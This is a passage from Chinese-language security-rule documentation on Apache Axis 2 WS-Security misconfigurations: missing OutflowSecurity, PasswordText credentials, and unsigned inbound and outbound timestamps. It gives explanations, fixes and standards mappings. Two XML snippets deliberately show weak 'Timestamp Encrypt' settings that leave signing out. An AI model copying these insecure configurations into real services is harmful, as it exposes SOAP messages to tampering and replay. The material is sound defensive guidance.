<p>顺序非常重要！将 Timestamp 指令置于 Signature 指令和 Encrypt 指令之前，可确保对时间戳进行签名和加密。</p>
<h5 id="REFERENCES-161"><a href="#REFERENCES-161" class="headerlink" title="REFERENCES"></a>REFERENCES</h5><p>[1] Securing SOAP Messages with Rampart Apache Software Foundation</p>
<p>[2] Standards Mapping - Common Weakness Enumeration CWE ID 254</p>
<p>[3] Standards Mapping - NIST Special Publication 800-53 Revision 4 SC-8 Transmission Confidentiality and Integrity (P1)</p>
<p>[4] Standards Mapping - OWASP Mobile Top 10 Risks 2014 M3 Insufficient Transport Layer Protection</p>
<p>[5] Standards Mapping - OWASP Top 10 2004 A10 Insecure Configuration Management</p>
<p>[6] Standards Mapping - OWASP Top 10 2010 A6 Security Misconfiguration</p>
<p>[7] Standards Mapping - OWASP Top 10 2013 A5 Security Misconfiguration</p>
<p>[8] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 Requirement 6.5.10</p>
<p>[9] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 Requirement 4.1, Requirement 6.5.4</p>
<p>[10] Standards Mapping - Payment Card Industry Data Security Standard Version 3.1 Requirement 4.1, Requirement 6.5.4</p>
<p>[11] Standards Mapping - Payment Card Industry Data Security Standard Version 3.2 Requirement 4.1, Requirement 6.5.4</p>
<p>[12] Standards Mapping - Security Technical Implementation Guide Version 3.1 APP3260.1 CAT II</p>
<p>[13] Standards Mapping - Security Technical Implementation Guide Version 3.10 APP3870 CAT I, APP3260 CAT II</p>
<p>[14] Standards Mapping - Security Technical Implementation Guide Version 3.4 APP3870 CAT I, APP3260 CAT II</p>
<p>[15] Standards Mapping - Security Technical Implementation Guide Version 3.5 APP3870 CAT I, APP3260 CAT II</p>
<p>[16] Standards Mapping - Security Technical Implementation Guide Version 3.6 APP3870 CAT I, APP3260 CAT II</p>
<p>[17] Standards Mapping - Security Technical Implementation Guide Version 3.7 APP3870 CAT I, APP3260 CAT II</p>
<p>[18] Standards Mapping - Security Technical Implementation Guide Version 3.9 APP3870 CAT I, APP3260 CAT II</p>
<p>[19] Standards Mapping - Security Technical Implementation Guide Version 4.1 APSC-DV-000180 CAT II, APSC-DV-000190 CAT I, APSC-DV-001620 CAT II, APSC-DV-001630 CAT II, APSC-DV-002440 CAT I, APSC-DV-002450 CAT II, APSC-DV-002460 CAT II, APSC-DV-002470 CAT II</p>
<p>[20] Standards Mapping - Security Technical Implementation Guide Version 4.2 APSC-DV-000180 CAT II, APSC-DV-000190 CAT I, APSC-DV-001620 CAT II, APSC-DV-001630 CAT II, APSC-DV-002440 CAT I, APSC-DV-002450 CAT II, APSC-DV-002460 CAT II, APSC-DV-002470 CAT II</p>
<p>[21] Standards Mapping - Security Technical Implementation Guide Version 4.3 APSC-DV-000180 CAT II, APSC-DV-000190 CAT I, APSC-DV-001620 CAT II, APSC-DV-001630 CAT II, APSC-DV-002440 CAT I, APSC-DV-002450 CAT II, APSC-DV-002460 CAT II, APSC-DV-002470 CAT II</p>
<p>[22] Standards Mapping - Web Application Security Consortium 24 + 2 Insufficient Authentication</p>
<p>[23] Standards Mapping - Web Application Security Consortium Version 2.00 Insufficient Transport Layer Protection (WASC-04)</p>
<h4 id="Axis-2-Service-Requester-Misconfiguration-Outbound-WS-Security-Not-Enabled"><a href="#Axis-2-Service-Requester-Misconfiguration-Outbound-WS-Security-Not-Enabled" class="headerlink" title="Axis 2 Service Requester Misconfiguration: Outbound WS-Security Not Enabled"></a>Axis 2 Service Requester Misconfiguration: Outbound WS-Security Not Enabled</h4><h5 id="ABSTRACT-163"><a href="#ABSTRACT-163" class="headerlink" title="ABSTRACT"></a>ABSTRACT</h5><p>若服务提供程序不使用 WS-Security，则难以保证消息的完整性或保密性。</p>
<h5 id="EXPLANATION-164"><a href="#EXPLANATION-164" class="headerlink" title="EXPLANATION"></a>EXPLANATION</h5><p>WS-Security 是 SOAP 的扩展功能，无论采用何种传输协议，它都能提供端到端的消息完整性和保密性。不使用 WS-Security 时，将依靠传输安全性来保证消息的完整性和保密性。如果一项服务将消息转发到其他服务，则会使用中继点之间最薄弱的传输机制传送消息。WS-Security 可移除传输安全性 dependency，并将安全性内置到消息中。</p>
<p>若 Apache Axis 2 配置文件中缺少 OutflowSecurity 参数，则表明未启用输出消息的安全性。</p>
<h5 id="RECOMMENDATIONS-163"><a href="#RECOMMENDATIONS-163" class="headerlink" title="RECOMMENDATIONS"></a>RECOMMENDATIONS</h5><p>将该客户端配置为对输出的请求使用 WS-Security。此配置应包含 OutflowSecurity 参数，如下例所示：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;axisconfig name=&quot;AxisJava2.0&quot;&gt;</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">    &lt;parameter name=&quot;OutflowSecurity&quot;&gt;</span><br><span class="line"></span><br><span class="line">...</span><br></pre></td></tr></table></figure>
<h5 id="REFERENCES-162"><a href="#REFERENCES-162" class="headerlink" title="REFERENCES"></a>REFERENCES</h5><p>[1] Securing SOAP Messages with Rampart Apache Software Foundation</p>
<p>[2] Standards Mapping - Common Weakness Enumeration CWE ID 311</p>
<p>[3] Standards Mapping - FIPS200 CM</p>
<p>[4] Standards Mapping - NIST Special Publication 800-53 Revision 4 SC-8 Transmission Confidentiality and Integrity (P1)</p>
<p>[5] Standards Mapping - OWASP Mobile Top 10 Risks 2014 M3 Insufficient Transport Layer Protection</p>
<p>[6] Standards Mapping - OWASP Top 10 2004 A10 Insecure Configuration Management</p>
<p>[7] Standards Mapping - OWASP Top 10 2007 A9 Insecure Communications</p>
<p>[8] Standards Mapping - OWASP Top 10 2010 A9 Insufficient Transport Layer Protection</p>
<p>[9] Standards Mapping - OWASP Top 10 2013 A5 Security Misconfiguration</p>
<p>[10] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 Requirement 4.1, Requirement 6.5.10</p>
<p>[11] Standards Mapping - Payment Card Industry Data Security Standard Version 1.2 Requirement 4.1, Requirement 6.3.1.4, Requirement 6.5.9</p>
<p>[12] Standards Mapping - Payment Card Industry Data Security Standard Version 2.0 Requirement 4.1, Requirement 6.5.4</p>
<p>[13] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 Requirement 4.1, Requirement 6.5.4</p>
<p>[14] Standards Mapping - Payment Card Industry Data Security Standard Version 3.1 Requirement 4.1, Requirement 6.5.4</p>
<p>[15] Standards Mapping - Payment Card Industry Data Security Standard Version 3.2 Requirement 4.1, Requirement 6.5.4</p>
<p>[16] Standards Mapping - SANS Top 25 2009 Insecure Interaction - CWE ID 319</p>
<p>[17] Standards Mapping - SANS Top 25 2010 Porous Defenses - CWE ID 311</p>
<p>[18] Standards Mapping - SANS Top 25 2011 Porous Defenses - CWE ID 311</p>
<p>[19] Standards Mapping - Security Technical Implementation Guide Version 3.1 APP3250.1 CAT I, APP3250.2 CAT I, APP3250.3 CAT II, APP3250.4 CAT II, APP3260.1 CAT II</p>
<p>[20] Standards Mapping - Security Technical Implementation Guide Version 3.10 APP3250.1 CAT I, APP3250.2 CAT I, APP3250.3 CAT II, APP3250.4 CAT II, APP3260 CAT II</p>
<p>[21] Standards Mapping - Security Technical Implementation Guide Version 3.4 APP3250.1 CAT I, APP3250.2 CAT I, APP3250.3 CAT II, APP3250.4 CAT II, APP3260 CAT II</p>
<p>[22] Standards Mapping - Security Technical Implementation Guide Version 3.5 APP3250.1 CAT I, APP3250.2 CAT I, APP3250.3 CAT II, APP3250.4 CAT II, APP3260 CAT II</p>
<p>[23] Standards Mapping - Security Technical Implementation Guide Version 3.6 APP3250.1 CAT I, APP3250.2 CAT I, APP3250.3 CAT II, APP3250.4 CAT II, APP3260 CAT II</p>
<p>[24] Standards Mapping - Security Technical Implementation Guide Version 3.7 APP3250.1 CAT I, APP3250.2 CAT I, APP3250.3 CAT II, APP3250.4 CAT II, APP3260 CAT II</p>
<p>[25] Standards Mapping - Security Technical Implementation Guide Version 3.9 APP3250.1 CAT I, APP3250.2 CAT I, APP3250.3 CAT II, APP3250.4 CAT II, APP3260 CAT II</p>
<p>[26] Standards Mapping - Security Technical Implementation Guide Version 4.1 APSC-DV-000180 CAT II, APSC-DV-000260 CAT II, APSC-DV-001620 CAT II, APSC-DV-001630 CAT II, APSC-DV-002440 CAT I, APSC-DV-002450 CAT II, APSC-DV-002460 CAT II, APSC-DV-002470 CAT II</p>
<p>[27] Standards Mapping - Security Technical Implementation Guide Version 4.2 APSC-DV-000180 CAT II, APSC-DV-000260 CAT II, APSC-DV-001620 CAT II, APSC-DV-001630 CAT II, APSC-DV-002440 CAT I, APSC-DV-002450 CAT II, APSC-DV-002460 CAT II, APSC-DV-002470 CAT II</p>
<p>[28] Standards Mapping - Security Technical Implementation Guide Version 4.3 APSC-DV-000180 CAT II, APSC-DV-000260 CAT II, APSC-DV-001620 CAT II, APSC-DV-001630 CAT II, APSC-DV-002440 CAT I, APSC-DV-002450 CAT II, APSC-DV-002460 CAT II, APSC-DV-002470 CAT II</p>
<p>[29] Standards Mapping - Web Application Security Consortium 24 + 2 Insufficient Authentication</p>
<p>[30] Standards Mapping - Web Application Security Consortium Version 2.00 Insufficient Transport Layer Protection (WASC-04)</p>
<h4 id="Axis-2-Service-Requester-Misconfiguration-Plain-Text-Password"><a href="#Axis-2-Service-Requester-Misconfiguration-Plain-Text-Password" class="headerlink" title="Axis 2 Service Requester Misconfiguration: Plain Text Password"></a>Axis 2 Service Requester Misconfiguration: Plain Text Password</h4><h5 id="ABSTRACT-164"><a href="#ABSTRACT-164" class="headerlink" title="ABSTRACT"></a>ABSTRACT</h5><p>避免使用 WS-Security 密码类型 PasswordText。</p>
<h5 id="EXPLANATION-165"><a href="#EXPLANATION-165" class="headerlink" title="EXPLANATION"></a>EXPLANATION</h5><p>使用 PasswordText 密码类型，可能表示实际密码是以明文发送的。WS-Security UsernameToken 配置文件说明<code>UsernameToken &lt;Password&gt;</code>标签中发送的文本不限于实际密码，它还可以包含派生的密码。然而，开发人员通常发送的是实际密码而不是派生的密码。发送未经加密的密码或密码散列值，都会将凭证泄漏给可以截取信息流的任何人。</p>
<h5 id="RECOMMENDATIONS-164"><a href="#RECOMMENDATIONS-164" class="headerlink" title="RECOMMENDATIONS"></a>RECOMMENDATIONS</h5><p>采用 PasswordDigest 密码类型，确保凭证在发送时已加密。采用 HTTPS 协议发送 SOAP 消息能确保凭证得到强大加密技术的保护，但如果消息将采用多种传输方式进行转发，更好的选择是使用 WS-Security 对消息自身进行加密。</p>
<p>下面提供了客户端配置，密码类型设为 PasswordDigest。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&lt;axisconfig name=&quot;AxisJava2.0&quot;&gt;</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">    &lt;parameter name=&quot;OutflowSecurity&quot;&gt;</span><br><span class="line"></span><br><span class="line">      &lt;action&gt;</span><br><span class="line"></span><br><span class="line">        &lt;items&gt;UsernameToken&lt;/items&gt;</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">        &lt;passwordType&gt;PasswordDigest&lt;/passwordType&gt;</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">&lt;/axisconfig&gt;</span><br></pre></td></tr></table></figure>
<h5 id="REFERENCES-163"><a href="#REFERENCES-163" class="headerlink" title="REFERENCES"></a>REFERENCES</h5><p>[1] Web Services Security Username Token Profile 1.0 OASIS</p>
<p>[2] Standards Mapping - Common Weakness Enumeration CWE ID 522</p>
<p>[3] Standards Mapping - FIPS200 MP</p>
<p>[4] Standards Mapping - NIST Special Publication 800-53 Revision 4 SC-8 Transmission Confidentiality and Integrity (P1)</p>
<p>[5] Standards Mapping - OWASP Mobile Top 10 Risks 2014 M3 Insufficient Transport Layer Protection</p>
<p>[6] Standards Mapping - OWASP Top 10 2004 A8 Insecure Storage</p>
<p>[7] Standards Mapping - OWASP Top 10 2007 A8 Insecure Cryptographic Storage</p>
<p>[8] Standards Mapping - OWASP Top 10 2010 A7 Insecure Cryptographic Storage</p>
<p>[9] Standards Mapping - OWASP Top 10 2013 A6 Sensitive Data Exposure</p>
<p>[10] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 Requirement 4.1, Requirement 6.5.10, Requirement 8.4</p>
<p>[11] Standards Mapping - Payment Card Industry Data Security Standard Version 1.2 Requirement 4.1, Requirement 6.3.1.3, Requirement 6.5.8, Requirement 8.4</p>
<p>[12] Standards Mapping - Payment Card Industry Data Security Standard Version 2.0 Requirement 4.1, Requirement 6.5.3, Requirement 8.4</p>
<p>[13] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 Requirement 4.1, Requirement 6.5.3, Requirement 8.2.1</p>
<p>[14] Standards Mapping - Payment Card Industry Data Security Standard Version 3.1 Requirement 4.1, Requirement 6.5.3, Requirement 8.2.1</p>
<p>[15] Standards Mapping - Payment Card Industry Data Security Standard Version 3.2 Requirement 4.1, Requirement 6.5.3, Requirement 8.2.1</p>
<p>[16] Standards Mapping - Security Technical Implementation Guide Version 3.1 APP3250.1 CAT I, APP3250.2 CAT I, APP3250.3 CAT II, APP3250.4 CAT II, APP3330 CAT I, APP3260.1 CAT II</p>
<p>[17] Standards Mapping - Security Technical Implementation Guide Version 3.10 APP3250.1 CAT I, APP3250.2 CAT I, APP3250.3 CAT II, APP3250.4 CAT II, APP3330 CAT I, APP3260 CAT II</p>
<p>[18] Standards Mapping - Security Technical Implementation Guide Version 3.4 APP3250.1 CAT I, APP3250.2 CAT I, APP3250.3 CAT II, APP3250.4 CAT II, APP3330 CAT I, APP3260 CAT II</p>
<p>[19] Standards Mapping - Security Technical Implementation Guide Version 3.5 APP3250.1 CAT I, APP3250.2 CAT I, APP3250.3 CAT II, APP3250.4 CAT II, APP3330 CAT I, APP3260 CAT II</p>
<p>[20] Standards Mapping - Security Technical Implementation Guide Version 3.6 APP3250.1 CAT I, APP3250.2 CAT I, APP3250.3 CAT II, APP3250.4 CAT II, APP3330 CAT I, APP3260 CAT II</p>
<p>[21] Standards Mapping - Security Technical Implementation Guide Version 3.7 APP3250.1 CAT I, APP3250.2 CAT I, APP3250.3 CAT II, APP3250.4 CAT II, APP3330 CAT I, APP3260 CAT II</p>
<p>[22] Standards Mapping - Security Technical Implementation Guide Version 3.9 APP3250.1 CAT I, APP3250.2 CAT I, APP3250.3 CAT II, APP3250.4 CAT II, APP3330 CAT I, APP3260 CAT II</p>
<p>[23] Standards Mapping - Security Technical Implementation Guide Version 4.1 APSC-DV-000220 CAT II, APSC-DV-001750 CAT I, APSC-DV-002440 CAT I, APSC-DV-002450 CAT II, APSC-DV-002460 CAT II, APSC-DV-002470 CAT II</p>
<p>[24] Standards Mapping - Security Technical Implementation Guide Version 4.2 APSC-DV-000220 CAT II, APSC-DV-001750 CAT I, APSC-DV-002440 CAT I, APSC-DV-002450 CAT II, APSC-DV-002460 CAT II, APSC-DV-002470 CAT II</p>
<p>[25] Standards Mapping - Security Technical Implementation Guide Version 4.3 APSC-DV-000220 CAT II, APSC-DV-001750 CAT I, APSC-DV-002440 CAT I, APSC-DV-002450 CAT II, APSC-DV-002460 CAT II, APSC-DV-002470 CAT II</p>
<p>[26] Standards Mapping - Web Application Security Consortium 24 + 2 Insufficient Authentication</p>
<p>[27] Standards Mapping - Web Application Security Consortium Version 2.00 Insufficient Transport Layer Protection (WASC-04)</p>
<h4 id="Axis-2-Service-Requester-Misconfiguration-Unsigned-Inbound-Timestamp"><a href="#Axis-2-Service-Requester-Misconfiguration-Unsigned-Inbound-Timestamp" class="headerlink" title="Axis 2 Service Requester Misconfiguration: Unsigned Inbound Timestamp"></a>Axis 2 Service Requester Misconfiguration: Unsigned Inbound Timestamp</h4><h5 id="ABSTRACT-165"><a href="#ABSTRACT-165" class="headerlink" title="ABSTRACT"></a>ABSTRACT</h5><p>未经签名的时间戳会导致 SOAP 消息遭受 tampering 及 replay 攻击。</p>
<h5 id="EXPLANATION-166"><a href="#EXPLANATION-166" class="headerlink" title="EXPLANATION"></a>EXPLANATION</h5><p>安全性时间戳可表明消息的“新鲜性”。如果攻击者截取了一则消息，稍后将其转发，则接收者能够拒绝此 replay 攻击，因为时间戳会指明该消息已过期。时间戳可包含有效期属性，通过该属性，可对安全语义的有效期设置一个硬限制。</p>
<p>为避免攻击者篡改时间戳，应对时间戳执行签名。如果 SOAP 消息的时间戳未经签名，则攻击者可在接收者不知情的情况下截取该消息、修改时间戳，以及转发该消息。在这种情况下，攻击者可能会欺骗接收者接受恶意消息。</p>
<p>下列客户端配置可让 Axis 2 接受未经签名的时间戳：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&lt;axisconfig name=&quot;AxisJava2.0&quot;&gt;</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">	&lt;parameter name=&quot;InflowSecurity&quot;&gt;</span><br><span class="line"></span><br><span class="line">		&lt;action&gt;</span><br><span class="line"></span><br><span class="line">			&lt;items&gt;Timestamp Encrypt&lt;/items&gt;</span><br><span class="line"></span><br><span class="line">			...</span><br><span class="line"></span><br><span class="line">		&lt;/action&gt;</span><br><span class="line"></span><br><span class="line">	&lt;/parameter&gt;</span><br><span class="line"></span><br><span class="line">&lt;/axisconfig&gt;</span><br></pre></td></tr></table></figure>
<h5 id="RECOMMENDATIONS-165"><a href="#RECOMMENDATIONS-165" class="headerlink" title="RECOMMENDATIONS"></a>RECOMMENDATIONS</h5><p>将此客户端配置为对输入的时间戳验证签名。</p>
<p>下列客户端配置可让 Axis 2 验证来自服务提供程序的消息签名：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&lt;axisconfig name=&quot;AxisJava2.0&quot;&gt;</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">	&lt;parameter name=&quot;InflowSecurity&quot;&gt;</span><br><span class="line"></span><br><span class="line">		&lt;action&gt;</span><br><span class="line"></span><br><span class="line">			&lt;items&gt;Timestamp Signature Encrypt&lt;/items&gt;</span><br><span class="line"></span><br><span class="line">			...</span><br><span class="line"></span><br><span class="line">		&lt;/action&gt;</span><br><span class="line"></span><br><span class="line">	&lt;/parameter&gt;</span><br><span class="line"></span><br><span class="line">&lt;/axisconfig&gt;</span><br></pre></td></tr></table></figure>
<p>顺序非常重要！将 Timestamp 指令置于 Signature 指令和 Encrypt 指令之前，可确保对时间戳进行签名和加密。</p>
<h5 id="REFERENCES-164"><a href="#REFERENCES-164" class="headerlink" title="REFERENCES"></a>REFERENCES</h5><p>[1] Securing SOAP Messages with Rampart Apache Software Foundation</p>
<p>[2] Web Services Security: SOAP Message Security 1.1 OASIS</p>
<p>[3] Standards Mapping - Common Weakness Enumeration CWE ID 345</p>
<p>[4] Standards Mapping - FIPS200 CM</p>
<p>[5] Standards Mapping - NIST Special Publication 800-53 Revision 4 SC-8 Transmission Confidentiality and Integrity (P1)</p>
<p>[6] Standards Mapping - OWASP Mobile Top 10 Risks 2014 M3 Insufficient Transport Layer Protection</p>
<p>[7] Standards Mapping - OWASP Top 10 2004 A10 Insecure Configuration Management</p>
<p>[8] Standards Mapping - OWASP Top 10 2010 A6 Security Misconfiguration</p>
<p>[9] Standards Mapping - OWASP Top 10 2013 A5 Security Misconfiguration</p>
<p>[10] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 Requirement 6.5.10</p>
<p>[11] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 Requirement 4.1, Requirement 6.5.4</p>
<p>[12] Standards Mapping - Payment Card Industry Data Security Standard Version 3.1 Requirement 4.1, Requirement 6.5.4</p>
<p>[13] Standards Mapping - Payment Card Industry Data Security Standard Version 3.2 Requirement 4.1, Requirement 6.5.4</p>
<p>[14] Standards Mapping - Security Technical Implementation Guide Version 3.1 APP3260.1 CAT II</p>
<p>[15] Standards Mapping - Security Technical Implementation Guide Version 3.10 APP3860 CAT II, APP3260 CAT II</p>
<p>[16] Standards Mapping - Security Technical Implementation Guide Version 3.4 APP3860 CAT II, APP3260 CAT II</p>
<p>[17] Standards Mapping - Security Technical Implementation Guide Version 3.5 APP3860 CAT II, APP3260 CAT II</p>
<p>[18] Standards Mapping - Security Technical Implementation Guide Version 3.6 APP3860 CAT II, APP3260 CAT II</p>
<p>[19] Standards Mapping - Security Technical Implementation Guide Version 3.7 APP3860 CAT II, APP3260 CAT II</p>
<p>[20] Standards Mapping - Security Technical Implementation Guide Version 3.9 APP3860 CAT II, APP3260 CAT II</p>
<p>[21] Standards Mapping - Security Technical Implementation Guide Version 4.1 APSC-DV-000180 CAT II, APSC-DV-001620 CAT II, APSC-DV-001630 CAT II, APSC-DV-002440 CAT I, APSC-DV-002450 CAT II, APSC-DV-002460 CAT II, APSC-DV-002470 CAT II</p>
<p>[22] Standards Mapping - Security Technical Implementation Guide Version 4.2 APSC-DV-000180 CAT II, APSC-DV-001620 CAT II, APSC-DV-001630 CAT II, APSC-DV-002440 CAT I, APSC-DV-002450 CAT II, APSC-DV-002460 CAT II, APSC-DV-002470 CAT II</p>
<p>[23] Standards Mapping - Security Technical Implementation Guide Version 4.3 APSC-DV-000180 CAT II, APSC-DV-001620 CAT II, APSC-DV-001630 CAT II, APSC-DV-002440 CAT I, APSC-DV-002450 CAT II, APSC-DV-002460 CAT II, APSC-DV-002470 CAT II</p>
<p>[24] Standards Mapping - Web Application Security Consortium 24 + 2 Insufficient Authentication</p>
<p>[25] Standards Mapping - Web Application Security Consortium Version 2.00 Insufficient Transport Layer Protection (WASC-04)</p>
<h4 id="Axis-2-Service-Requester-Misconfiguration-Unsigned-Outbound-Timestamp"><a href="#Axis-2-Service-Requester-Misconfiguration-Unsigned-Outbound-Timestamp" class="headerlink" title="Axis 2 Service Requester Misconfiguration: Unsigned Outbound Timestamp"></a>Axis 2 Service Requester Misconfiguration: Unsigned Outbound Timestamp</h4><h5 id="ABSTRACT-166"><a href="#ABSTRACT-166" class="headerlink" title="ABSTRACT"></a>ABSTRACT</h5><p>未经签名的时间戳会导致 SOAP 消息遭受 tampering 及 replay 攻击。</p>
<h5 id="EXPLANATION-167"><a href="#EXPLANATION-167" class="headerlink" title="EXPLANATION"></a>EXPLANATION</h5><p>安全性时间戳可表明消息的“新鲜性”。如果攻击者截取了一则消息，稍后将其转发，则接收者能够拒绝此 replay 攻击，因为时间戳会指明该消息已过期。时间戳可包含有效期属性，通过该属性，可对安全语义的有效期设置一个硬限制。</p>
<p>为避免攻击者篡改时间戳，应对时间戳执行签名。如果 SOAP 消息的时间戳未经签名，则攻击者可在接收者不知情的情况下截取该消息、修改时间戳，以及转发该消息。在这种情况下，攻击者可能会欺骗接收者接受恶意消息。</p>
<p>下列客户端配置可让 Axis 2 发送未经签名的时间戳：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&lt;axisconfig name=&quot;AxisJava2.0&quot;&gt;</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">	&lt;parameter name=&quot;OutflowSecurity&quot;&gt;</span><br><span class="line"></span><br><span class="line">		&lt;action&gt;</span><br><span class="line"></span><br><span class="line">			&lt;items&gt;Timestamp Encrypt&lt;/items&gt;</span><br><span class="line"></span><br><span class="line">			...</span><br><span class="line"></span><br><span class="line">		&lt;/action&gt;</span><br><span class="line"></span><br><span class="line">	&lt;/parameter&gt;</span><br><span class="line"></span><br><span class="line">&lt;/axisconfig&gt;</span><br></pre></td></tr></table></figure>
<h5 id="RECOMMENDATIONS-166"><a href="#RECOMMENDATIONS-166" class="headerlink" title="RECOMMENDATIONS"></a>RECOMMENDATIONS</h5><p>将此客户端配置为对输出的时间戳进行签名。</p>
<p>下列客户端配置可让 Axis 2 对输出的时间戳进行签名：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&lt;axisconfig name=&quot;AxisJava2.0&quot;&gt;</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">	&lt;parameter name=&quot;OutflowSecurity&quot;&gt;</span><br><span class="line"></span><br><span class="line">		&lt;action&gt;</span><br><span class="line"></span><br><span class="line">			&lt;items&gt;Timestamp Signature Encrypt&lt;/items&gt;</span><br><span class="line"></span><br><span class="line">			...</span><br><span class="line"></span><br><span class="line">		&lt;/action&gt;</span><br><span class="line"></span><br><span class="line">	&lt;/parameter&gt;</span><br><span class="line"></span><br><span class="line">&lt;/axisconfig&gt;</span><br></pre></td></tr></table></figure>
<p>顺序非常重要！将 Timestamp 指令置于 Signature 指令和 Encrypt 指令之前，可确保对时间戳进行签名和加密。</p>
<h5 id="REFERENCES-165"><a href="#REFERENCES-165" class="headerlink" title="REFERENCES"></a>REFERENCES</h5><p>[1] Securing SOAP Messages with Rampart Apache Software Foundation</p>
<p>[2] Web Services Security: SOAP Message Security 1.1 OASIS</p>
<p>[3] Standards Mapping - Common Weakness Enumeration CWE ID 345</p>
<p>[4] Standards Mapping - FIPS200 CM</p>
<p>[5] Standards Mapping - NIST Special Publication 800-53 Revision 4 SC-8 Transmission Confidentiality and Integrity (P1)</p>
<p>[6] Standards Mapping - OWASP Mobile Top 10 Risks 2014 M3 Insufficient Transport Layer Protection</p>
<p>[7] Standards Mapping - OWASP Top 10 2004 A10 Insecure Configuration Management</p>
<p>[8] Standards Mapping - OWASP Top 10 2010 A6 Security Misconfiguration</p>
<p>[9] Standards Mapping - OWASP Top 10 2013 A5 Security Misconfiguration</p>
<p>[10] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 Requirement 6.5.10</p>
<p>[11] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 Requirement 4.1, Requirement 6.5.4</p>
<p>[12] Standards Mapping - Payment Card Industry Data Security Standard Version 3.1 Requirement 4.1, Requirement 6.5.4</p>
<p>[13] Standards Mapping - Payment Card Industry Data Security Standard Version 3.2 Requirement 4.1, Requirement 6.5.4</p>
<p>[14] Standards Mapping - Security Technical Implementation Guide Version 3.1 APP3260.1 CAT II</p>
<p>[15] Standards Mapping - Security Technical Implementation Guide Version 3.10 APP3860 CAT II, APP3260 CAT II</p>
<p>[16] Standards Mapping - Security Technical Implementation Guide Version 3.4 APP3860 CAT II, APP3260 CAT II</p>
<p>[17] Standards Mapping - Security Technical Implementation Guide Version 3.5 APP3860 CAT II, APP3260 CAT II</p>
<p>[18] Standards Mapping - Security Technical Implementation Guide Version 3.6 APP3860 CAT II, APP3260 CAT II</p>
<p>[19] Standards Mapping - Security Technical Implementation Guide Version 3.7 APP3860 CAT II, APP3260 CAT II</p>
<p>[20] Standards Mapping - Security Technical Implementation Guide Version 3.9 APP3860 CAT II, APP3260 CAT II</p>
<p>[21] Standards Mapping - Security Technical Implementation Guide Version 4.1 APSC-DV-000180 CAT II, APSC-DV-001620 CAT II, APSC-DV-001630 CAT II, APSC-DV-002440 CAT I, APSC-DV-002450 CAT II, APSC-DV-002460 CAT II, APSC-DV-002470 CAT II</p>
<p>[22] Standards Mapping - Security Technical Implementation Guide Version 4.2 APSC-DV-000180 CAT II, APSC-DV-001620 CAT II, APSC-DV-001630 CAT II, APSC-DV-002440 CAT I, APSC-DV-002450 CAT II, APSC-DV-002460 CAT II, APSC-DV-002470 CAT II</p>
<p>[23] Standards Mapping - Security Technical Implementation Guide Version 4.3 APSC-DV-000180 CAT II, APSC-DV-001620 CAT II, APSC-DV-001630 CAT II, APSC-DV-002440 CAT I, APSC-DV-002450 CAT II, APSC-DV-002460 CAT II, APSC-DV-002470 CAT II</p>
<p>[24] Standards Mapping - Web Application Security Consortium 24 + 2 Insufficient Authentication</p>
